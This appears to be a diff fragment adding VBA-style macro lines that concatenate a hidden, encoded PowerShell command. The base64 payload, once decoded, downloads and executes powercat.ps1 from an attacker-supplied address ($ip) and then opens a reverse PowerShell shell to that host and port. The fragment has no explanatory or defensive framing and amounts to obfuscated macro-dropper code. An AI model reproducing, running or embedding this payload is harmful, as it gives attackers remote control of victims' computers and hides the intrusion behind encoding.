@@ -1,0 +1,8 @@
+Str = str+"powershell.exe $base64_payload"
+Str = str+"powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
+Str = str+"wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
+Str = str+"uAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
+Str = str+"GQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABpAHA"
+Str = str+"ALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAiACkAOwBwAG8Ad"
+Str = str+"wBlAHIAYwBhAHQAIAAtAGMAIAAkAGkAcAAgAC0AcAAgACQAcAB"
+Str = str+"vAHIAdAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA="
